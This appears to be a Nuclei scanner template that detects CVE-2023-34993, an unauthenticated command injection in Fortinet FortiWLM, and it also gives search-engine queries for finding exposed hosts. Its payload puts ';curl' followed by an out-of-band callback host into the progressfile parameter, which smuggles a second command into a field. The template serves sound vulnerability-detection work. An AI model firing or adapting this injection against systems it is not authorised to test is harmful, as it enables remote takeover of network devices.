http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/ems/cgi-bin/ezrf_upgrade_images.cgi?op_type=deleteprogressfile&progressfile={{url_encode(progressfile)}}'
id: CVE-2023-34993
info:
  author: dwisiswant0
  classification:
    cpe: cpe:2.3:a:fortinet:fortiwlm:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-34993
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99374
    epss-score: 0.86419
  description: 'A improper neutralization of special elements used in an os command
    (''os

    command injection'') in Fortinet FortiWLM version 8.6.0 through 8.6.5 and

    8.5.0 through 8.5.4 allows attacker to execute unauthorized code or commands

    Successful exploitation of this vulnerability could allow an attacker to

    bypass authentication and gain unauthorized access to the affected system.

    '
  impact: 'Unauthenticated attackers can exploit OS command injection to execute unauthorized
    commands on Fortinet FortiWLM systems, enabling complete system compromise and
    network infiltration.

    '
  metadata:
    fofa-query:
    - body="fortiwlm"
    - title="fortiwlm"
    google-query: intitle:"fortiwlm"
    max-request: 1
    product: fortiwlm
    shodan-query:
    - http.title:"FortiWLM"
    - http.html:"fortiwlm"
    - http.title:"fortiwlm"
    vendor: fortinet
  name: Fortinet FortiWLM Unauthenticated Command Injection Vulnerability
  reference:
  - https://fortiguard.com/psirt/FG-IR-23-140
  - https://www.horizon3.ai/attack-research/attack-blogs/fortiwlm-the-almost-story-for-the-forti-forty/
  remediation: 'For FortiWLM version 8.6.0 through 8.6.5 upgrade to version >= 8.6.6.

    For FortiWLM version 8.5.0 through 8.5.4 upgrade to version >= 8.5.5.

    '
  severity: critical
  tags: cve,cve2023,fortinet,fortiwlm,rce,unauth,vkev,vuln
variables:
  progressfile: '{{rand_base(5)}};curl {{interactsh-url}} #'
